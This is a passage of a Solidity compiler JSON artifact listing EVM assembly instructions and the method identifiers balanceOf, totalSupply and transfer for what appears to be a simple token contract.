											"end": 552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 363,
											"end": 559,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 363,
											"end": 559,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 363,
											"end": 559,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 363,
											"end": 559,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 363,
											"end": 559,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 565,
											"end": 972,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 565,
											"end": 972,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 565,
											"end": 972,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 565,
											"end": 972,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 690,
											"end": 692,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 678,
											"end": 687,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 669,
											"end": 676,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 665,
											"end": 688,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 661,
											"end": 693,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 658,
											"end": 660,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 658,
											"end": 660,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 658,
											"end": 660,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 706,
											"end": 707,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 703,
											"end": 704,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 696,
											"end": 708,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 658,
											"end": 660,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 658,
											"end": 660,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 749,
											"end": 750,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 774,
											"end": 827,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 819,
											"end": 826,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 810,
											"end": 816,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 799,
											"end": 808,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 795,
											"end": 817,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 774,
											"end": 827,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 774,
											"end": 827,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 774,
											"end": 827,
											"name": "tag",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 774,
											"end": 827,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 764,
											"end": 827,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 764,
											"end": 827,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 720,
											"end": 837,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 876,
											"end": 878,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 902,
											"end": 955,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 947,
											"end": 954,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 938,
											"end": 944,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 927,
											"end": 936,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 923,
											"end": 945,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 902,
											"end": 955,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 902,
											"end": 955,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 902,
											"end": 955,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 902,
											"end": 955,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 892,
											"end": 955,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 892,
											"end": 955,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 847,
											"end": 965,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 648,
											"end": 972,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 978,
											"end": 1087,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 978,
											"end": 1087,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1059,
											"end": 1080,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1074,
											"end": 1079,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1059,
											"end": 1080,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1059,
											"end": 1080,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1059,
											"end": 1080,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1059,
											"end": 1080,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1054,
											"end": 1057,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1047,
											"end": 1081,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1037,
											"end": 1087,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1037,
											"end": 1087,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1037,
											"end": 1087,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1093,
											"end": 1211,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1093,
											"end": 1211,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1180,
											"end": 1204,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1198,
											"end": 1203,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1180,
											"end": 1204,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1180,
											"end": 1204,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1180,
											"end": 1204,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1180,
											"end": 1204,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1175,
											"end": 1178,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1168,
											"end": 1205,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1158,
											"end": 1211,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1158,
											"end": 1211,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1158,
											"end": 1211,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1217,
											"end": 1427,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1217,
											"end": 1427,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1217,
											"end": 1427,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1342,
											"end": 1344,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1331,
											"end": 1340,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1345,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1319,
											"end": 1345,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1319,
											"end": 1345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1355,
											"end": 1420,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1417,
											"end": 1418,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1406,
											"end": 1415,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1402,
											"end": 1419,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1393,
											"end": 1399,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1355,
											"end": 1420,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 1355,
											"end": 1420,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1355,
											"end": 1420,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1355,
											"end": 1420,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1427,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1427,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1427,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1427,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1427,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1433,
											"end": 1655,
											"name": "tag",
											"source": 2,
											"value": "9"
										},
										{
											"begin": 1433,
											"end": 1655,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1433,
											"end": 1655,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1564,
											"end": 1566,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1553,
											"end": 1562,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1549,
											"end": 1567,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1541,
											"end": 1567,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1541,
											"end": 1567,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1648,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1645,
											"end": 1646,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1634,
											"end": 1643,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1647,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1621,
											"end": 1627,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1577,
											"end": 1648,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1577,
											"end": 1648,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1577,
											"end": 1648,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1577,
											"end": 1648,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1655,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1655,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1655,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1655,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1655,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1661,
											"end": 1966,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 1661,
											"end": 1966,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1661,
											"end": 1966,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1720,
											"end": 1740,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1738,
											"end": 1739,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1720,
											"end": 1740,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1720,
											"end": 1740,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1720,
											"end": 1740,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1720,
											"end": 1740,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1715,
											"end": 1740,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1715,
											"end": 1740,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1774,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1772,
											"end": 1773,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1774,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1754,
											"end": 1774,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1754,
											"end": 1774,
											"name": "tag",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1754,
											"end": 1774,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1749,
											"end": 1774,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1749,
											"end": 1774,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1908,
											"end": 1909,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1840,
											"end": 1906,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1836,
											"end": 1910,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1833,
											"end": 1834,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1830,
											"end": 1911,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 1827,
											"end": 1829,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1827,
											"end": 1829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1827,
											"end": 1829,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1914,
											"end": 1932,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 1914,
											"end": 1932,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1914,
											"end": 1932,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1914,
											"end": 1932,
											"name": "tag",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 1914,
											"end": 1932,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1827,
											"end": 1829,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1827,
											"end": 1829,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1958,
											"end": 1959,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1955,
											"end": 1956,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1951,
											"end": 1960,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1944,
											"end": 1960,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1944,
											"end": 1960,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1705,
											"end": 1966,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1705,
											"end": 1966,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1705,
											"end": 1966,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1705,
											"end": 1966,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1705,
											"end": 1966,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1972,
											"end": 2163,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1972,
											"end": 2163,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2163,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2050,
											"end": 2051,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2084,
											"end": 2085,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2105,
											"end": 2106,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2102,
											"end": 2103,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2099,
											"end": 2107,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 2096,
											"end": 2098,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2096,
											"end": 2098,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2096,
											"end": 2098,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2110,
											"end": 2128,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 2110,
											"end": 2128,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2110,
											"end": 2128,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2110,
											"end": 2128,
											"name": "tag",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 2110,
											"end": 2128,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2096,
											"end": 2098,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2096,
											"end": 2098,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2155,
											"end": 2156,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2152,
											"end": 2153,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2148,
											"end": 2157,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2140,
											"end": 2157,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2140,
											"end": 2157,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2017,
											"end": 2163,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2017,
											"end": 2163,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2017,
											"end": 2163,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2017,
											"end": 2163,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2017,
											"end": 2163,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2169,
											"end": 2265,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2169,
											"end": 2265,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2169,
											"end": 2265,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2235,
											"end": 2259,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2253,
											"end": 2258,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2235,
											"end": 2259,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2235,
											"end": 2259,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2235,
											"end": 2259,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2235,
											"end": 2259,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2224,
											"end": 2259,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2224,
											"end": 2259,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2214,
											"end": 2265,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2214,
											"end": 2265,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2214,
											"end": 2265,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2214,
											"end": 2265,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2271,
											"end": 2361,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 2271,
											"end": 2361,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2271,
											"end": 2361,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2348,
											"end": 2353,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2341,
											"end": 2354,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2334,
											"end": 2355,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2323,
											"end": 2355,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2323,
											"end": 2355,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2313,
											"end": 2361,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2313,
											"end": 2361,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2313,
											"end": 2361,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2313,
											"end": 2361,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2367,
											"end": 2493,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2367,
											"end": 2493,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2367,
											"end": 2493,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2444,
											"end": 2486,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2437,
											"end": 2442,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2433,
											"end": 2487,
											"name": "AND",
											"source": 2
										},
										{
											"begin": 2422,
											"end": 2487,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2422,
											"end": 2487,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2412,
											"end": 2493,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2412,
											"end": 2493,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2412,
											"end": 2493,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2412,
											"end": 2493,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2499,
											"end": 2576,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2499,
											"end": 2576,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2499,
											"end": 2576,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2565,
											"end": 2570,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2554,
											"end": 2570,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2554,
											"end": 2570,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2544,
											"end": 2576,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2544,
											"end": 2576,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2544,
											"end": 2576,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2544,
											"end": 2576,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2582,
											"end": 2762,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2582,
											"end": 2762,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2630,
											"end": 2707,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2627,
											"end": 2628,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2620,
											"end": 2708,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2731,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 2724,
											"end": 2725,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2717,
											"end": 2732,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2751,
											"end": 2755,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2748,
											"end": 2749,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2741,
											"end": 2756,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2768,
											"end": 2890,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 2768,
											"end": 2890,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2841,
											"end": 2865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "77"
										},
										{
											"begin": 2859,
											"end": 2864,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2841,
											"end": 2865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2841,
											"end": 2865,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2841,
											"end": 2865,
											"name": "tag",
											"source": 2,
											"value": "77"
										},
										{
											"begin": 2841,
											"end": 2865,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2834,
											"end": 2839,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2831,
											"end": 2866,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2821,
											"end": 2823,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2821,
											"end": 2823,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2880,
											"end": 2881,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2877,
											"end": 2878,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2870,
											"end": 2882,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2821,
											"end": 2823,
											"name": "tag",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2821,
											"end": 2823,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2811,
											"end": 2890,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2811,
											"end": 2890,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 2896,
											"end": 3018,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 2896,
											"end": 3018,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2969,
											"end": 2993,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2987,
											"end": 2992,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2969,
											"end": 2993,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2969,
											"end": 2993,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 2969,
											"end": 2993,
											"name": "tag",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2969,
											"end": 2993,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2962,
											"end": 2967,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2959,
											"end": 2994,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2949,
											"end": 2951,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 2949,
											"end": 2951,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3008,
											"end": 3009,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3005,
											"end": 3006,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 2998,
											"end": 3010,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2949,
											"end": 2951,
											"name": "tag",
											"source": 2,
											"value": "81"
										},
										{
											"begin": 2949,
											"end": 2951,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2939,
											"end": 3018,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2939,
											"end": 3018,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb"
						}
					},
